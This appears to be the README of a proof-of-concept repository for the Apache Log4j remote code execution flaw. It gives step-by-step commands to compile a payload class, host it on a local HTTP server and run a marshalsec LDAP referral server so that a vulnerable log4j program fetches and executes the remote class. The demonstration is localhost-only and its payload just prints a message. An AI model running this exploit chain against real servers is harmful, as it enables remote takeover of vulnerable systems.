# Apache-Log4j
Apache Log4j 远程代码执行

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响


### Steps
1. 【Important】***Move*** Log4jRCE.java to /home/remote/Log4jRCE.java, or any other directories except apache-log4j-poc.

2. Compile Log4jRCE.java and start http server
   1. `cd /home/remote`
   2. `javac Log4jRCE.java`
   3. start http server，python or php，`php -S 127.0.0.1:8888`

3. Start ldap server
   1. `git clone git@github.com:mbechler/marshalsec.git`
   2. `cd marshalsec`
   3. `mvn clean package -DskipTests`
   4. start ldap server `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
   
4. Start log4j.java, then you can see `I am Log4jRCE from remote!!!`

